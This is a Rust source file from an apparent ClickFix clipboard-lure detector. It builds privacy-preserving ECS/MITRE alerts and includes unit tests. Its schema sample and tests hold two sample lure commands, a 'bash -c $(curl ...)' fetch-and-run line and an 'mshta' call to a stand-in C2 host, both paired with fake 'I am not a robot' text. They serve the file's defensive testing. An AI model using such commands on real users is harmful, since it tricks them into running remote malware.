//! The one alert schema every output renders from.
//!
//! Field names follow ECS 8.x where a field exists (`@timestamp`, `event.*`, `host.*`,
//! `user.*`, `url.*`, `process.*`, `threat.*`, `rule.*`), so Elastic and Splunk ingest
//! it without a custom parser. Everything engine-specific lives under `clickfixed.*`.
//!
//! **Privacy is enforced here, not in the outputs.** The builder never receives the raw
//! clipboard text: it takes the verdict (which carries only a SHA-256 of the content) and
//! the decoder's output layers. Feature evidence snippets, which are slices of the raw
//! text, are dropped. Password-manager sources are refused. Origin URLs lose userinfo,
//! query and fragment. Alert fields are crate-private, so no output can add content.

use crate::severity::{Band, SeverityMap, VerdictName};
use cfx_engine::{deobfus::Layer, sha256_hex, FeatureClass, Origin, Target, Verdict};
use serde::Serialize;
use time::OffsetDateTime;

pub const ECS_VERSION: &str = "8.11.0";
/// Longest decoded command carried in an alert, in bytes.
pub const MAX_DECODED: usize = 4096;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum Action {
    /// Signal 1: a clipboard write scored suspicious or malicious.
    ClipboardCommandFlagged,
    /// Signal 2: a flagged clipboard command was executed.
    PastedCommandExecuted,
    /// Signal 2: a command run from a shell scored suspicious or malicious on its own
    /// (typed, or not matched to the clipboard).
    SuspiciousCommandExecuted,
}

impl Action {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::ClipboardCommandFlagged => "clipboard-command-flagged",
            Self::PastedCommandExecuted => "pasted-command-executed",
            Self::SuspiciousCommandExecuted => "suspicious-command-executed",
        }
    }
    fn signal(self) -> u8 {
        match self {
            Self::ClipboardCommandFlagged => 1,
            _ => 2,
        }
    }
    fn rule_name(self) -> &'static str {
        match self {
            Self::ClipboardCommandFlagged => "ClickFix lure on clipboard",
            Self::PastedCommandExecuted => "Flagged pasted command executed",
            Self::SuspiciousCommandExecuted => "Suspicious shell command executed",
        }
    }
}

/// MITRE detection analytic for T1204.004 on this platform.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Platform {
    Windows,
    Linux,
    Macos,
}

impl Platform {
    pub fn current() -> Self {
        if cfg!(target_os = "windows") {
            Self::Windows
        } else if cfg!(target_os = "macos") {
            Self::Macos
        } else {
            Self::Linux
        }
    }
    pub fn analytic(self) -> &'static str {
        match self {
            Self::Windows => "AN0962",
            Self::Linux => "AN0963",
            Self::Macos => "AN0964",
        }
    }
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Windows => "windows",
            Self::Linux => "linux",
            Self::Macos => "macos",
        }
    }
}

/// Built once at startup.
#[derive(Debug, Clone)]
pub struct AlertContext {
    pub host: String,
    pub user: String,
    pub platform: Platform,
    pub severity: SeverityMap,
    password_managers: Vec<String>,
}

impl AlertContext {
    pub fn new(
        host: String,
        user: String,
        platform: Platform,
        severity: SeverityMap,
        password_managers: Vec<String>,
    ) -> Self {
        Self {
            host,
            user,
            platform,
            severity,
            password_managers: password_managers
                .into_iter()
                .map(|p| p.to_ascii_lowercase())
                .collect(),
        }
    }

    fn is_password_manager(&self, app: &str) -> bool {
        let app = app.to_ascii_lowercase();
        self.password_managers
            .iter()
            .any(|p| app == *p || app.contains(p.as_str()))
    }
}

#[derive(Debug, Clone, Default)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: Option<String>,
    pub executable: Option<String>,
    pub parent_name: Option<String>,
}

/// What the daemon hands the schema. Deliberately has no field for the raw text.
pub struct AlertInput<'a> {
    pub action: Action,
    pub verdict: &'a Verdict,
    /// Decoder output layers (from the fast-path trace). The last one is the decoded command.
    pub layers: &'a [Layer],
    pub origin: &'a Origin,
    pub target: &'a Target,
    /// App that wrote the clipboard, if known.
    pub source_app: Option<&'a str>,
    pub process: Option<ProcessInfo>,
    /// Block mode replaced the clipboard.
    pub blocked: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Suppressed {
    /// Content came from a password manager. Never alerted, never logged.
    PasswordManager,
    /// No severity band for this verdict/score (benign by default).
    NoSeverityBand,
}

#[derive(Debug, Clone, Serialize)]
pub struct Alert {
    #[serde(rename = "@timestamp")]
    pub(crate) timestamp: String,
    #[serde(skip)]
    pub(crate) epoch_ms: i64,
    pub(crate) ecs: Ecs,
    pub(crate) event: Event,
    pub(crate) agent: Agent,
    pub(crate) host: Host,
    pub(crate) user: User,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(crate) url: Option<Url>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(crate) process: Option<Process>,
    pub(crate) threat: Threat,
    pub(crate) rule: Rule,
    pub(crate) tags: Vec<&'static str>,
    pub(crate) clickfixed: Detail,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Ecs {
    pub version: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Event {
    pub kind: &'static str,
    pub module: &'static str,
    pub dataset: &'static str,
    pub action: Action,
    pub category: Vec<&'static str>,
    #[serde(rename = "type")]
    pub kind_type: Vec<&'static str>,
    pub id: String,
    /// ECS numeric severity, from the mapping.
    pub severity: u8,
    /// The engine's continuous score.
    pub risk_score: f64,
    pub reason: String,
    pub outcome: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Agent {
    #[serde(rename = "type")]
    pub kind: &'static str,
    pub name: &'static str,
    pub version: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Host {
    pub name: String,
    pub hostname: String,
    pub os: HostOs,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct HostOs {
    #[serde(rename = "type")]
    pub kind: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct User {
    pub name: String,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Url {
    pub full: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Process {
    pub pid: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub executable: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub parent: Option<ProcessParent>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct ProcessParent {
    pub name: String,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Threat {
    pub framework: &'static str,
    pub tactic: Named,
    pub technique: Technique,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Technique {
    pub id: Vec<&'static str>,
    pub name: Vec<&'static str>,
    pub reference: Vec<&'static str>,
    pub subtechnique: Named,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Named {
    pub id: Vec<&'static str>,
    pub name: Vec<&'static str>,
    pub reference: Vec<&'static str>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Rule {
    pub id: String,
    pub name: &'static str,
    pub ruleset: &'static str,
    pub version: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Detail {
    pub verdict: VerdictName,
    pub score: f64,
    /// Sum of feature weights after dampening, before context multipliers.
    pub base_score: f64,
    pub thresholds: Thresholds,
    pub severity: SeverityOut,
    pub features: Vec<FeatureOut>,
    pub dampened_by: Vec<DampenOut>,
    pub multipliers: Vec<MultiplierOut>,
    pub command: Command,
    pub origin: OriginOut,
    pub target: TargetOut,
    pub signal: u8,
    pub analytic: Analytic,
    /// sha256(host + "\n" + command sha256). Stable across re-copies and executions.
    pub dedupe_key: String,
    pub blocked: bool,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Thresholds {
    pub warn: f64,
    pub block: f64,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct SeverityOut {
    pub name: String,
    pub rank: usize,
    pub wazuh_level: u8,
    pub syslog: u8,
    pub cef: u8,
    pub slack_color: String,
    pub jira_priority: String,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct FeatureOut {
    pub id: String,
    pub class: FeatureClass,
    /// Contribution to the base score (after dampening).
    pub weight: f64,
    /// Rule weight before dampening.
    pub raw_weight: f64,
    /// 0 = raw text, n = n-th decoded layer.
    pub layer: usize,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct DampenOut {
    pub entry: String,
    pub feature: String,
    pub amount: f64,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct MultiplierOut {
    pub name: &'static str,
    pub factor: f64,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Command {
    /// SHA-256 of the raw command. The raw text itself is never carried.
    pub sha256: String,
    /// The deobfuscator's final layer, when it resolved one.
    pub decoded: Option<String>,
    pub decoded_truncated: bool,
    /// Decoders applied per layer.
    pub decode_layers: Vec<Vec<&'static str>>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct OriginOut {
    /// browser | application | unknown
    pub kind: &'static str,
    /// vendor_docs | internal | unknown
    pub domain_class: &'static str,
    pub source_app: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct TargetOut {
    /// run_dialog | terminal | quick_access_menu | unknown
    pub kind: &'static str,
    pub application: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Analytic {
    pub id: &'static str,
    pub platform: &'static str,
}

fn round3(x: f64) -> f64 {
    ((x * 1000.0).round() / 1000.0) + 0.0
}

fn rfc3339(t: OffsetDateTime) -> String {
    t.format(&time::format_description::well_known::Rfc3339)
        .unwrap_or_else(|_| t.unix_timestamp().to_string())
}

/// Page URL without userinfo, query or fragment (those can carry session tokens).
fn sanitize_url(url: &str) -> String {
    let cut = url.find(['?', '#']).unwrap_or(url.len());
    let url = &url[..cut];
    match url.split_once("://") {
        Some((scheme, rest)) => {
            let (auth, path) = rest.split_at(rest.find('/').unwrap_or(rest.len()));
            let host = auth.rsplit('@').next().unwrap_or(auth);
            format!("{scheme}://{host}{path}")
        }
        None => url.to_string(),
    }
}

fn truncate_at_char(s: &str, max: usize) -> (&str, bool) {
    if s.len() <= max {
        return (s, false);
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    (&s[..end], true)
}

/// Unique per event: dedupe key + nanosecond timestamp + action. Deterministic, so a
/// replayed sample reproduces byte-for-byte.
fn event_id(key: &str, ts: &str, action: Action) -> String {
    sha256_hex(format!("{key}\n{ts}\n{}", action.as_str()).as_bytes())[..32].to_string()
}

pub fn dedupe_key(host: &str, command_sha256: &str) -> String {
    sha256_hex(format!("{host}\n{command_sha256}").as_bytes())
}

fn severity_out(rank: usize, b: &Band) -> SeverityOut {
    SeverityOut {
        name: b.name.clone(),
        rank,
        wazuh_level: b.wazuh_level,
        syslog: b.syslog,
        cef: b.cef,
        slack_color: b.slack_color.clone(),
        jira_priority: b.jira_priority.clone(),
    }
}

fn process_out(p: ProcessInfo) -> Process {
    Process {
        pid: p.pid,
        name: p.name,
        executable: p.executable,
        parent: p.parent_name.map(|name| ProcessParent { name }),
    }
}

impl Alert {
    pub fn build(ctx: &AlertContext, input: AlertInput<'_>) -> Result<Alert, Suppressed> {
        Self::build_at(ctx, input, OffsetDateTime::now_utc())
    }

    pub fn build_at(
        ctx: &AlertContext,
        input: AlertInput<'_>,
        now: OffsetDateTime,
    ) -> Result<Alert, Suppressed> {
        let origin_app = input.origin.app_name();
        if input
            .source_app
            .into_iter()
            .chain(origin_app)
            .any(|a| ctx.is_password_manager(a))
        {
            return Err(Suppressed::PasswordManager);
        }
        let v = input.verdict;
        let verdict = VerdictName::from_level(v.level);
        let (rank, band) = ctx
            .severity
            .classify(verdict, v.score)
            .ok_or(Suppressed::NoSeverityBand)?;

        let features: Vec<FeatureOut> = v
            .features
            .iter()
            .filter(|f| f.weight > 0.0 || f.raw > 0.0)
            .map(|f| FeatureOut {
                id: f.feature.clone(),
                class: f.class,
                weight: round3(f.weight),
                raw_weight: round3(f.raw),
                layer: f.layer,
            })
            .collect();
        let reason = {
            let fired: Vec<&str> = features
                .iter()
                .filter(|f| f.weight > 0.0)
                .map(|f| f.id.as_str())
                .collect();
            format!(
                "{} (score {:.2}): {}",
                verdict.as_str(),
                v.score,
                if fired.is_empty() {
                    "-".into()
                } else {
                    fired.join(", ")
                }
            )
        };

        let (decoded, decoded_truncated) = match input.layers.last() {
            Some(l) => {
                let (s, t) = truncate_at_char(&l.text, MAX_DECODED);
                (Some(s.to_string()), t)
            }
            None => (None, false),
        };

        let (url, origin_kind) = match input.origin {
            Origin::Browser { url, .. } => (
                url.as_deref().map(|u| Url {
                    full: sanitize_url(u),
                    domain: cfx_engine::host_of(u),
                }),
                "browser",
            ),
            Origin::Application { .. } => (None, "application"),
            Origin::Unknown => (None, "unknown"),
        };
        let target_app = match input.target {
            Target::Terminal { shell } => Some(shell.clone()),
            _ => None,
        };

        let key = dedupe_key(&ctx.host, &v.sha256);
        let ts = rfc3339(now);
        let process = input.process.map(process_out);
        let mut category = vec!["intrusion_detection"];
        let mut kind_type = vec!["info"];
        if process.is_some() {
            category.push("process");
            kind_type.push("start");
        }

        Ok(Alert {
            event: Event {
                kind: "alert",
                module: "clickfixed",
                dataset: "clickfixed.alert",
                action: input.action,
                category,
                kind_type,
                id: event_id(&key, &ts, input.action),
                severity: band.ecs,
                risk_score: round3(v.score),
                reason,
                outcome: if input.blocked { "success" } else { "unknown" },
            },
            timestamp: ts,
            epoch_ms: (now.unix_timestamp_nanos() / 1_000_000) as i64,
            ecs: Ecs {
                version: ECS_VERSION,
            },
            agent: Agent {
                kind: "clickfixed",
                name: "clickfixed",
                version: env!("CARGO_PKG_VERSION"),
            },
            host: Host {
                name: ctx.host.clone(),
                hostname: ctx.host.clone(),
                os: HostOs {
                    kind: ctx.platform.as_str(),
                },
            },
            user: User {
                name: ctx.user.clone(),
            },
            url,
            process,
            threat: Threat {
                framework: "MITRE ATT&CK",
                tactic: Named {
                    id: vec!["TA0002"],
                    name: vec!["Execution"],
                    reference: vec!["https://attack.mitre.org/tactics/TA0002/"],
                },
                technique: Technique {
                    id: vec!["T1204"],
                    name: vec!["User Execution"],
                    reference: vec!["https://attack.mitre.org/techniques/T1204/"],
                    subtechnique: Named {
                        id: vec!["T1204.004"],
                        name: vec!["Malicious Copy and Paste"],
                        reference: vec!["https://attack.mitre.org/techniques/T1204/004/"],
                    },
                },
            },
            rule: Rule {
                id: format!("clickfixed:{}", input.action.as_str()),
                name: input.action.rule_name(),
                ruleset: "clickfixed",
                version: env!("CARGO_PKG_VERSION"),
            },
            tags: vec!["clickfixed", "T1204.004"],
            clickfixed: Detail {
                verdict,
                score: round3(v.score),
                base_score: round3(v.base),
                thresholds: Thresholds {
                    warn: round3(v.warn_threshold),
                    block: round3(v.block_threshold),
                },
                severity: severity_out(rank, band),
                features,
                dampened_by: v
                    .dampens
                    .iter()
                    .map(|d| DampenOut {
                        entry: d.entry.clone(),
                        feature: d.feature.clone(),
                        amount: round3(d.before - d.after),
                    })
                    .collect(),
                multipliers: v
                    .multipliers
                    .iter()
                    .map(|m| MultiplierOut {
                        name: m.name,
                        factor: m.factor,
                    })
                    .collect(),
                command: Command {
                    sha256: v.sha256.clone(),
                    decoded,
                    decoded_truncated,
                    decode_layers: v.decode_layers.clone(),
                },
                origin: OriginOut {
                    kind: origin_kind,
                    domain_class: input.origin.class().as_str(),
                    source_app: input.source_app.or(origin_app).map(String::from),
                },
                target: TargetOut {
                    kind: input.target.as_str(),
                    application: target_app,
                },
                signal: input.action.signal(),
                analytic: Analytic {
                    id: ctx.platform.analytic(),
                    platform: ctx.platform.as_str(),
                },
                dedupe_key: key,
                blocked: input.blocked,
            },
        })
    }

    /// The flagged clipboard command behind this alert was executed. Same command hash,
    /// same dedupe key (so Jira comments on the existing ticket); new action and process.
    pub fn executed(&self, process: ProcessInfo) -> Alert {
        self.executed_at(process, OffsetDateTime::now_utc())
    }

    pub fn executed_at(&self, process: ProcessInfo, now: OffsetDateTime) -> Alert {
        let mut a = self.clone();
        a.timestamp = rfc3339(now);
        a.epoch_ms = (now.unix_timestamp_nanos() / 1_000_000) as i64;
        a.event.id = event_id(
            &a.clickfixed.dedupe_key,
            &a.timestamp,
            Action::PastedCommandExecuted,
        );
        a.event.action = Action::PastedCommandExecuted;
        a.event.category = vec!["intrusion_detection", "process"];
        a.event.kind_type = vec!["info", "start"];
        a.rule.id = format!("clickfixed:{}", Action::PastedCommandExecuted.as_str());
        a.rule.name = Action::PastedCommandExecuted.rule_name();
        a.clickfixed.signal = 2;
        if let Some(parent) = process.parent_name.clone() {
            a.clickfixed.target = TargetOut {
                kind: "terminal",
                application: Some(parent),
            };
        }
        a.process = Some(process_out(process));
        a
    }

    pub fn action(&self) -> Action {
        self.event.action
    }
    pub fn dedupe_key(&self) -> &str {
        &self.clickfixed.dedupe_key
    }
    pub fn severity_rank(&self) -> usize {
        self.clickfixed.severity.rank
    }
    pub fn severity_name(&self) -> &str {
        &self.clickfixed.severity.name
    }
    pub fn verdict(&self) -> VerdictName {
        self.clickfixed.verdict
    }
    pub fn score(&self) -> f64 {
        self.clickfixed.score
    }
    pub fn command_sha256(&self) -> &str {
        &self.clickfixed.command.sha256
    }

    pub fn to_json_line(&self) -> String {
        serde_json::to_string(self).expect("alert serializes")
    }

    pub fn to_value(&self) -> serde_json::Value {
        serde_json::to_value(self).expect("alert serializes")
    }

    /// An alert with every optional field populated, for validating template paths.
    pub fn schema_sample() -> Alert {
        let ctx = AlertContext::new(
            "host".into(),
            "user".into(),
            Platform::current(),
            SeverityMap::default(),
            vec![],
        );
        let engine = cfx_engine::Engine::default();
        let obs = cfx_engine::Observation::new(
            "bash -c \"$(curl -fsSL https://example.invalid/x)\" # I am not a robot - Verification ID: 1",
        )
            .origin(Origin::Browser {
                url: Some("https://example.invalid/p".into()),
                domain_class: cfx_engine::DomainClass::Unknown,
            })
            .target(Target::Terminal { shell: "bash".into() });
        let (v, trace) = engine.fast_path_traced(&obs);
        let mut a = Alert::build(
            &ctx,
            AlertInput {
                action: Action::ClipboardCommandFlagged,
                verdict: &v,
                layers: &trace.layers,
                origin: &obs.origin,
                target: &obs.target,
                source_app: Some("firefox"),
                process: None,
                blocked: false,
            },
        )
        .unwrap_or_else(|e| panic!("schema sample must alert: {e:?}"));
        a = a.executed(ProcessInfo {
            pid: 1,
            name: Some("sh".into()),
            executable: Some("/bin/sh".into()),
            parent_name: Some("bash".into()),
        });
        if a.clickfixed.command.decoded.is_none() {
            a.clickfixed.command.decoded = Some(String::new());
        }
        a
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use cfx_engine::{DomainClass, Engine, Observation};

    fn ctx() -> AlertContext {
        AlertContext::new(
            "ws-17".into(),
            "alice".into(),
            Platform::Linux,
            SeverityMap::default(),
            vec!["keepassxc".into(), "1password".into()],
        )
    }

    fn alert_for(raw: &str, source: Option<&str>) -> Result<Alert, Suppressed> {
        let obs = Observation::new(raw)
            .origin(Origin::Browser {
                url: Some("https://user:pw@lure.invalid/fix?session=abc#x".into()),
                domain_class: DomainClass::Unknown,
            })
            .target(Target::RunDialog);
        let (v, trace) = Engine::default().fast_path_traced(&obs);
        Alert::build(
            &ctx(),
            AlertInput {
                action: Action::ClipboardCommandFlagged,
                verdict: &v,
                layers: &trace.layers,
                origin: &obs.origin,
                target: &obs.target,
                source_app: source,
                process: None,
                blocked: false,
            },
        )
    }

    const LURE: &str =
        "mshta https://c2.invalid/verify.mp4 # I am not a robot - reCAPTCHA Verification ID: 2165";

    #[test]
    fn raw_content_never_serialized() {
        let a = alert_for(LURE, Some("firefox")).unwrap();
        let json = a.to_json_line();
        // No 12-byte window of the raw command appears anywhere in the alert.
        let bytes = LURE.as_bytes();
        for w in bytes.windows(12) {
            let s = std::str::from_utf8(w).unwrap();
            assert!(!json.contains(s), "raw fragment {s:?} leaked: {json}");
        }
        assert!(json.contains(&sha256_hex(LURE.as_bytes())));
        assert!(!json.contains("evidence"));
    }

    #[test]
    fn origin_url_is_sanitized() {
        let a = alert_for(LURE, Some("firefox")).unwrap();
        let u = a.url.as_ref().unwrap();
        assert_eq!(u.full, "https://lure.invalid/fix");
        assert_eq!(u.domain.as_deref(), Some("lure.invalid"));
    }

    #[test]
    fn password_manager_refused() {
        assert_eq!(
            alert_for(LURE, Some("KeePassXC")).unwrap_err(),
            Suppressed::PasswordManager
        );
    }

    #[test]
    fn benign_has_no_band() {
        assert_eq!(
            alert_for("git status", Some("firefox")).unwrap_err(),
            Suppressed::NoSeverityBand
        );
    }

    #[test]
    fn dedupe_key_stable_across_execution() {
        let a = alert_for(LURE, Some("firefox")).unwrap();
        let e = a.executed(ProcessInfo {
            pid: 42,
            name: Some("mshta".into()),
            ..Default::default()
        });
        assert_eq!(a.dedupe_key(), e.dedupe_key());
        assert_eq!(a.dedupe_key(), dedupe_key("ws-17", a.command_sha256()));
        assert_ne!(a.event.id, e.event.id);
        assert_eq!(e.action(), Action::PastedCommandExecuted);
    }

    #[test]
    fn ecs_shape() {
        let v = alert_for(LURE, Some("firefox")).unwrap().to_value();
        assert_eq!(v["event"]["kind"], "alert");
        assert_eq!(v["ecs"]["version"], ECS_VERSION);
        assert_eq!(
            v["threat"]["technique"]["subtechnique"]["id"][0],
            "T1204.004"
        );
        assert_eq!(v["clickfixed"]["analytic"]["id"], "AN0963");
        assert_eq!(v["clickfixed"]["verdict"], "malicious");
        assert!(v["@timestamp"].is_string());
    }
}
